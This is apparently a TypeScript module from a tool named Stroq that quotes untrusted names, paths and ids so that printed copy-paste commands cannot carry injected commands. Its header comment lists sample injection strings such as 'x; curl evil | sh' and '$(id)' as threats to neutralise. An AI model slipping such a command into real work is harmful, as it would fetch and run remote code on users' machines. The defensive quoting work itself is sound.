// Command lines that Stroq prints for a person to copy and paste.
//
// A name, a path, a source or an id in such a line comes from a package, a skill, a lock or a config that somebody
// else wrote, so it must never become a second command when it is pasted: `x; curl evil | sh`, `$(id)`, a backtick,
// a quote, a newline, `&`, `%PATH%`, `^`. Every printed command is built here, from words Stroq wrote (trusted) and
// values from outside, and the rules are these:
//
// - A value is one argument. On a POSIX shell it is put between single quotes, the only quoting in which nothing is
//   expanded, with a quote in it written as `'\''`. On Windows (cmd.exe and PowerShell both) it is put between double
//   quotes when nothing in it is expanded there; a value with `"`, `%`, `^`, `!`, `$` or a backtick in it is not
//   quoted at all but replaced by a placeholder, because no one quoting is safe in both shells.
// - A value that cannot be shown (a control character, a newline, NUL, a character that is invisible or reverses the
//   text, a lone surrogate) or that is longer than a path can be is replaced by a placeholder such as
//   `<unprintable-name>`. The placeholder is not a command to run: the person is meant to find the real value, and a
//   line pasted with it in does nothing harmful (a shell reads `<unprintable-name` as a redirection from a file).
// - A positional value that starts with `-` would be read as an option, so such a line puts `--` before the
//   positionals, and an option's value that starts with `-` is written `--flag=value`.
//
// The terminal control characters of a value are therefore never printed, either.

/** What a value is, for the placeholder that takes its place. */
export type Kind = 'name' | 'path' | 'source' | 'id' | 'value';

/** The most a value may have before it is replaced: longer than any path, so a hostile one cannot flood a line. */
const MAX_UNITS = 4096;

/** Characters that cannot be shown as they are: controls, what shows nothing or changes what is shown, lone surrogates. */
const UNSHOWABLE = /[\p{Cc}\p{Cf}\p{Cs}\p{Zl}\p{Zp}\p{Default_Ignorable_Code_Point}]/u;
/** Characters that a POSIX shell reads as themselves anywhere in a word (no `~`, which expands at the start). */
const PLAIN_POSIX = /^[A-Za-z0-9_@%+=:,./-]+$/;
/** Characters that cmd.exe or PowerShell would act on even between double quotes. */
const EXPANDED_ON_WINDOWS = /["%^!$`]/;
const PLAIN_WINDOWS = /^[A-Za-z0-9_@+=:,./\\-]+$/;

const placeholder = (what: Kind, why: 'unprintable' | 'long'): string =>
  why === 'long' ? `<${what}-too-long>` : `<unprintable-${what}>`;

/** One value as one word of a command line, or a placeholder when it cannot be made one safely. */
export function quoteWord(
  value: string,
  what: Kind = 'value',
  platform: NodeJS.Platform = process.platform,
  forbid = '',
): string {
  if (value.length > MAX_UNITS) return placeholder(what, 'long');
  if (UNSHOWABLE.test(value) || [...forbid].some((char) => value.includes(char)))
    return placeholder(what, 'unprintable');
  if (platform !== 'win32')
    return PLAIN_POSIX.test(value) ? value : `'${value.replaceAll("'", `'\\''`)}'`;
  if (PLAIN_WINDOWS.test(value)) return value;
  if (EXPANDED_ON_WINDOWS.test(value)) return placeholder(what, 'unprintable');
  // A backslash before the closing quote would escape it for the program that reads the line.
  return `"${value}${/\\+$/.exec(value)?.[0] ?? ''}"`;
}

/** What a piece of a command line is. A string is a word that Stroq wrote; the others are values from outside. */
export type Piece =
  | string
  /** A positional argument. */
  | { readonly positional: string; readonly what?: Kind }
  /** An option with a value: `--flag value`. */
  | { readonly flag: string; readonly value: string; readonly what?: Kind }
  /** A word in a place that is already past `--`, so that it is never read as an option. */
  | { readonly word: string; readonly what?: Kind };

export interface LineOptions {
  readonly platform?: NodeJS.Platform;
  /** Characters that make a value a placeholder, for a line that goes into text where they mean something (a backtick in Markdown). */
  readonly forbid?: string;
}

/** The place of a positional in the words of a line, until it is known whether they all stay where they are. */
const HOLE = Symbol('positional');

/** The command line of the pieces, with every value quoted, in the order given. */
export function commandLine(pieces: readonly Piece[], options: LineOptions = {}): string {
  const { platform = process.platform, forbid = '' } = options;
  const quote = (value: string, what: Kind | undefined): string =>
    quoteWord(value, what, platform, forbid);
  const words: (string | typeof HOLE)[] = [];
  const positionals: string[] = [];
  let leadingDash = false;
  for (const piece of pieces) {
    if (typeof piece === 'string') words.push(piece);
    else if ('flag' in piece) {
      const word = quote(piece.value, piece.what);
      if (piece.value.startsWith('-')) words.push(`${piece.flag}=${word}`);
      else words.push(piece.flag, word);
    } else if ('word' in piece) words.push(quote(piece.word, piece.what));
    else {
      leadingDash ||= piece.positional.startsWith('-');
      positionals.push(quote(piece.positional, piece.what));
      words.push(HOLE);
    }
  }
  // A positional stays where it was written, unless one starts with `-`: then all of them go after `--`.
  if (leadingDash)
    return [...words.filter((word) => word !== HOLE), '--', ...positionals].join(' ');
  let next = 0;
  return words.map((word) => (word === HOLE ? positionals[next++]! : word)).join(' ');
}
